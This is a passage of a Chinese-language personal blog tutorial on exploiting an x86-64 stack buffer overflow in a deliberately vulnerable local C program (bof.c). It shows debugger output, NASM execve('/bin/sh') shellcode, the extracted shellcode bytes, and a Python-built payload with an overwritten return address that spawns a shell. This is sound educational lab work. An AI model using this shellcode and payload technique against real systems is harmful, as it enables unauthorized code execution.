class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde68│+0x0000: 0x00007fffffffdd40  →  0x0000000000000000	 ← $rsp</span><br><span class="line">0x00007fffffffde70│+0x0008: 0x00007ffff7ffc620  →  0x00050a3600000000</span><br><span class="line">0x00007fffffffde78│+0x0010: 0x00007fffffffdf58  →  0x00007fffffffe2a7  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffde80│+0x0018: 0x0000000200000000</span><br><span class="line">0x00007fffffffde88│+0x0020: 0x00005555555551a9  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde90│+0x0028: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde98│+0x0030: 0x81a925b6868c83d3</span><br><span class="line">0x00007fffffffdea0│+0x0038: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x55555555521d &lt;main+116&gt;       call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555222 &lt;main+121&gt;       mov    eax, 0x0</span><br><span class="line">   0x555555555227 &lt;main+126&gt;       leave  </span><br><span class="line"> → 0x555555555228 &lt;main+127&gt;       ret    </span><br><span class="line">   ↳  0x7fffffffdd40                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd42                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd44                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd46                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd48                  and    dl, BYTE PTR [rdx+0x55]</span><br><span class="line">      0x7fffffffdd4b                  push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────── source:bof.c+14 ────</span><br><span class="line">      9	       &#125;</span><br><span class="line">     10	       printf(&quot;%p\n&quot;, buffer);</span><br><span class="line">     11	       strcpy(buffer,  argv[1]);</span><br><span class="line">     12	       printf(&quot;%s\n&quot;, buffer);</span><br><span class="line">     13	       return 0;</span><br><span class="line"> →   14	 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x555555555228 <span class="keyword">in</span> main (), reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf58)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到，此时的栈顶 (<code>rsp</code>) 为 <code>0x00007fffffffdd40</code>，<code>ret</code> 执行后 <code>rip</code> 就将跳转到 <code>0x00007fffffffdd40</code> 处执行。</p><h2 id="6-执行shellcode"><a class="markdownIt-Anchor" href="#6-执行shellcode"></a> 6. 执行shellcode</h2><p>在这个例子中我准备用个定制的shellcode去打开 shell 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">	; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">	; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27;</span><br><span class="line">	xor		rdx, rdx</span><br><span class="line">	mov		qword rbx, &#x27;//bin/sh&#x27;		; 0x68732f6e69622f2f</span><br><span class="line">	shr		rbx, 0x8</span><br><span class="line">	push		rbx</span><br><span class="line">	mov		rdi, rsp</span><br><span class="line">	push		rax</span><br><span class="line">	push		rdi</span><br><span class="line">	mov		rsi, rsp</span><br><span class="line">	mov		al, 0x3b</span><br><span class="line">	syscall</span><br></pre></td></tr></table></figure><p>接下来汇编这个文件然后提取shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ touch shell.asm</span><br><span class="line">sakura@Kylin:~/文档/overflow$ nasm -f elf64 shell.asm </span><br><span class="line">sakura@Kylin:~/文档/overflow$ ld -m elf_x86_64 shell.o -o shell </span><br><span class="line">sakura@Kylin:~/文档/overflow$ ./shell</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">sakura@Kylin:~/文档/overflow$ for i in $(objdump  -d shell.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05</span><br><span class="line">sakura@Kylin:~/文档/overflow$ </span><br></pre></td></tr></table></figure><p>这个 shellcode 长 30 字节，来构造最终的载荷吧。</p><p>原来的载荷</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print &quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>我们要保证一样的大小所以264 - 30 = 234</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print &quot;A&quot; * 234 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>然后把 shellcode 接在开头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>来把所有东西一块儿测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gdb-gef bof</span> </span><br><span class="line">gef➤  run $(python -c &#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;) </span><br><span class="line">Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;)</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;</span><br><span class="line">0x7fffffffdd40</span><br><span class="line">H1�H�//bin/shH�SH��PWH��;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`����</span><br><span class="line">process 4893 is executing new program: /usr/bin/dash</span><br><span class="line"><span class="meta">$ </span></span><br></pre></td></tr></table></figure><p>出现了 $ 就显示我们执行成功了。要注意内存地址是可以变化的这样可能就和我这里的不同了。</p><blockquote><p>参考：</p><p><a target="_blank" rel="noopener" href="http://packetstormsecurity.com/files/download/127007/64bit-overflow.pdf">64 Bits Linux Stack Based Buffer Overflow </a>— 英文原文</p><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903571742261262#heading-0">64位Linux下的栈溢出</a> — 中文翻译</p></blockquote></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" title="栈溢出x86_64" target="_blank" rel="external">https://www.rgzzplus.com/2022/08/27/栈溢出x86-64/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/rgzz-zq" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/rgzz-zq" target="_blank"><span class="text-dark">人工智障plus</span><small class="ml-1x"></small></a></h3><div>一只网安菜鸟。</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" title="整数安全"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/" title="格式化字符串x86_64"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_pv">总访问量：<span id="busuanzi_value_site_pv"></span></span> <span class="post-meta-divider"><br></span><span id="busuanzi_container_site_uv">总访客数：<span id="busuanzi_value_site_uv"></span></span></div><div class="copyright">&copy; 2022 rgzzplus<div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!0,notify:!0,appId:"Ese7lhBjjv43UJw6zLdiIfS0-gzGzoHsz",appKey:"FF6J9UoHgtozwmftxTYfrvqn",placeholder:"说点什么吧！",avatar:"mm",meta:meta,pageSize:"10",visitor:!0})</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?94cb135e2b01d42780f4972cb63e3884";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>